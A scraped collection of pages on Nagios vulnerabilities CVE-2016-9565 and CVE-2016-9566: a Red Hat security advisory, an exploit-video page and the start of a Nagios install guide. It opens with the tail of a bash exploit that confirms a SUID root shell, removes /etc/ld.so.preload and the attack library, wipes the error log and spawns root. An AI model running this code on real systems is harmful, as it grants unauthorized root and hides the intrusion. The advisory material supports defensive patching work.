ls -l $BACKDOORPATH | grep rws | grep -q root 2>/dev/null
if [ $? -eq 0 ]; then
echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
echo -e "\n\033[94mGot root via Nagios!\033[0m"
else
echo -e "\n[!] Failed to get root: \n`ls -l $BACKDOORPATH`"
cleanexit 2
fi
# Use the rootshell to perform cleanup that requires root privileges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
rm -f $ERRORLOG
echo > $ERRORLOG
# Execute the rootshell
echo -e "\n[+] Nagios pwned. Spawning the rootshell $BACKDOORPATH now\n"
$BACKDOORPATH -p -i
# Job done.
cleanexit 0


=== Content from bugs.gentoo.org_deccdc35_20250126_033718.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Search by bug number

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?keywords=i&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?keywords=i&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

You may find a single bug by entering its bug id here:

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?keywords=i&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?keywords=i&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from rhn.redhat.com_b687e8af_20250124_212413.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2017:0258 - Security Advisory

Issued:
2017-02-07
Updated:
2017-02-07
# RHSA-2017:0258 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: nagios security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0258)

## Topic

An update for nagios is now available for Red Hat Gluster Storage 3.1 for RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Nagios is a program that monitors hosts and services on your network, and has the ability to send email or page alerts when a problem arises or is resolved.

Security Fix(es):

* It was found that an attacker who could control the content of an RSS feed could execute code remotely using the Nagios web interface. This flaw could be used to gain access to the remote system and in some scenarios control over the system. (CVE-2016-9565)
* A privilege escalation flaw was found in the way Nagios handled log files. An attacker able to control the Nagios logging configuration (the 'nagios' user/group) could use this flaw to elevate their privileges to root. (CVE-2016-9566)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat Gluster Storage Server for On-premise 3 for RHEL 7 x86\_64
* Red Hat Gluster Storage Nagios Server 3 for RHEL 7 x86\_64

## Fixes

* [BZ - 1402869](https://bugzilla.redhat.com/show_bug.cgi?id=1402869)
  - CVE-2016-9566 nagios: Privilege escalation issue
* [BZ - 1405363](https://bugzilla.redhat.com/show_bug.cgi?id=1405363)
  - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS

## CVEs

* [CVE-2016-9565](https://www.redhat.com/security/data/cve/CVE-2016-9565.html)
* [CVE-2016-9566](https://www.redhat.com/security/data/cve/CVE-2016-9566.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Gluster Storage Server for On-premise 3 for RHEL 7

| SRPM | |
| --- | --- |
| nagios-3.5.1-9.el7.src.rpm | SHA-256: 22be84749fe4d4876bf2252ea1ecfae60b887499272dd2c1664a3620ed20d636 |
| x86\_64 | |
| nagios-common-3.5.1-9.el7.x86\_64.rpm | SHA-256: 8e13e8b11bf94b0d3d2e0c2a9eaed02f82482a3191dbe30a40565b521f59a120 |
| nagios-debuginfo-3.5.1-9.el7.x86\_64.rpm | SHA-256: e92f087a7d2b3083f049929fd439e2a5de38cc817d5c9f1fa48c1672d4514feb |

## Red Hat Gluster Storage Nagios Server 3 for RHEL 7

| SRPM | |
| --- | --- |
| x86\_64 | |
| nagios-3.5.1-9.el7.x86\_64.rpm | SHA-256: 7888c2212b5be85dff6f97fdfa4518ee4b16e899e6dfc36bc83e4936f0c76400 |
| nagios-common-3.5.1-9.el7.x86\_64.rpm | SHA-256: 8e13e8b11bf94b0d3d2e0c2a9eaed02f82482a3191dbe30a40565b521f59a120 |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_58237a83_20250126_033722.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from legalhackers.com_10fd0ead_20250126_033726.html ===


## Nagios Expoit Video PoC

## [Nagios Core < 4.2.2 Curl Cmd Injection / Remote Code Execution (CVE-2016-9565)](https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)[Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)Discovered by **Dawid Golunski** [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) <https://legalhackers.com> **Description:** The video below demonstrates how an attacker using the [CVE-2016-9565](https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html) vulnerability in Nagios, could gain access to the Nagios server in the context of www-data/nagios user and escalate their privileges to root by exploiting the Root Privilege Escalation vulnerability [CVE-2016-9566](https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html). To receive updates on this as well as new vulnerabilities: [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) ~~~~~~~~~~~ **ExploitBox.io** ~~~~~~~~~~~~~~~~ **Interested in security / vulns / exploits ?** Check out the new project of the author of this advisory: [**ExploitBox.io**A Playground & Labs for security folks into HACKING &AMp the art of exploitation](https://ExploitBox.io) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 **[<-- BACK TO legalhackers.com](https://legalhackers.com)**



=== Content from assets.nagios.com_e803aacd_20250126_033740.html ===


| | [KB Home](https://support.nagios.com/kb/index.php "KB Home") | [Search](https://support.nagios.com/kb/search.php "Advanced Search") | [Glossary](https://support.nagios.com/kb/glossary.php "Glossary") | [Login](https://support.nagios.com/kb/login.php "Login Now") | [Try Nagios XI](https://www.nagios.com/products/nagios-xi/) |  | | --- | --- | | Nagios Support Knowledgebase |  |  | [All Categories](https://support.nagios.com/kb/category.php) Expand Category [\*HOWTOs (115)](https://support.nagios.com/kb/category.php?id=196)     Expand Category [\*Jumpstart Guides\* (29)](https://support.nagios.com/kb/category.php?id=191)     Expand Category [Check Library (17)](https://support.nagios.com/kb/category.php?id=186)     Expand Category [Community Bounties (3)](https://support.nagios.com/kb/category.php?id=202)     Expand Category [General Topics (126)](https://support.nagios.com/kb/category.php?id=13)     Collapse Category [Products (1223)](https://support.nagios.com/kb/category.php?id=1)     Collapse Category [Nagios Core (228)](https://support.nagios.com/kb/category.php?id=12)     Expand Category [Documentation (209)](https://support.nagios.com/kb/category.php?id=62)     Collapse Category [Installation (4)](https://support.nagios.com/kb/category.php?id=58)     article [Nagios Core - Installing Nagios Core From Source](https://support.nagios.com/kb/article/nagios-core-installing-nagios-core-from-source-96.html)  article [Nagios Core - Installing Nagios Core on Ubuntu](https://support.nagios.com/kb/article/nagios-core-installing-nagios-core-on-ubuntu-97.html)  article [Nagios Core - Quickstart Installation Guides](https://support.nagios.com/kb/article/nagios-core-quickstart-installation-guides-345.html)  article [Nagios XI - What Platforms Does Nagios XI Run On](https://support.nagios.com/kb/article/nagios-xi-what-platforms-does-nagios-xi-run-on-687.html)  Expand Category [Troubleshooting (15)](https://support.nagios.com/kb/category.php?id=80)     Expand Category [Nagios Fusion (52)](https://support.nagios.com/kb/category.php?id=5)     Expand Category [Nagios Log Server (103)](https://support.nagios.com/kb/category.php?id=3)     Expand Category [Nagios Network Analyzer (59)](https://support.nagios.com/kb/category.php?id=4)     Expand Category [Nagios Plugins (2)](https://support.nagios.com/kb/category.php?id=166)     Expand Category [Nagios XI (665)](https://support.nagios.com/kb/category.php?id=2)     Expand Category [NCPA (19)](https://support.nagios.com/kb/category.php?id=8)     Expand Category [NDOUtils (4)](https://support.nagios.com/kb/category.php?id=9)     Expand Category [NRDP (16)](https://support.nagios.com/kb/category.php?id=119)     Expand Category [NRDS (9)](https://support.nagios.com/kb/category.php?id=124)     Expand Category [NRPE (47)](https://support.nagios.com/kb/category.php?id=10)     Expand Category [NSCA (15)](https://support.nagios.com/kb/category.php?id=11)     Expand Category [NSTI (4)](https://support.nagios.com/kb/category.php?id=16)     Expand Category [Support Documents (12)](https://support.nagios.com/kb/category.php?id=26)     Expand Category [Webinars (4)](https://support.nagios.com/kb/category.php?id=181) | | [Home](https://support.nagios.com/kb/index.php) » [Categories](https://support.nagios.com/kb/category.php) » [Products](https://support.nagios.com/kb/category.php?id=1) » [Nagios Core](https://support.nagios.com/kb/category.php?id=12) » [Installation](https://support.nagios.com/kb/category.php?id=58) | | --- | | Nagios Core - Installing Nagios Core From Source | | Article Number: 96 | Rating: 4.2/5 from 62 votes | Last Updated by **sdemoret** on Thu, Jan 16, 2025 at 10:01 AM [**-> EDIT ARTICLE <-**](/kb/admin/edit-article.php?aid=96) | | Installing Nagios Core From Source  This document describes how to install Nagios Core from source.  This guide is broken up into several sections and covers different operating system (OS) distributions. If your OS Distribution is not included in this guide then please contact us to see if we can get it added. Some distributions may be missing as we don't have access to a test environment that allows us to develop the documentation.  Nagios Core 4.4.14 and Nagios Plugins 2.4.6 are the versions used in this guide, however future versions should also work fine with these steps.  NOTE: As of Nagios Core 4.4.7, openssl is a required prerequisite. This command has been added in the documentation below for the more popular distributions (CentOS, RHEL, Ubuntu, etc...). If you are using other distributions (Solaris, Gentoo, etc...) you will need to run the appropriate command to install openssl in the prerequisite section.  This documentation is broken up into two distinct sections:   * Install Nagios Core * Install Nagios Plugins   This separation is to make a clear distinction as to what prerequisite packages are required by the OS it is being installed on. For example the SNMP packages are installed as part of the Nagios Plugins section, as SNMP is not required by Nagios Core.    Please select your OS:   * [Red Hat Enterprise Linux (RHEL)](#RHEL "Red Hat Enterprise Linux (RHEL)") * [CentOS](#CentOS "CentOS") * [Oracle Linux](#Oracle_Linux "Oracle Linux") * [Ubuntu](#Ubuntu "Ubuntu") * [SUSE SLES | openSUSE Leap](#SUSE "SUSE SLES | openSUSE Leap") * [Debian](#Debian "Debian") * [Raspbian](#Raspbian "Raspbian") * [Fedora](#Fedora "Fedora") * [Arch Linux](#Arch_Linux "Arch Linux") * [Gentoo](#Gentoo "Gentoo") * [FreeBSD](#FreeBSD 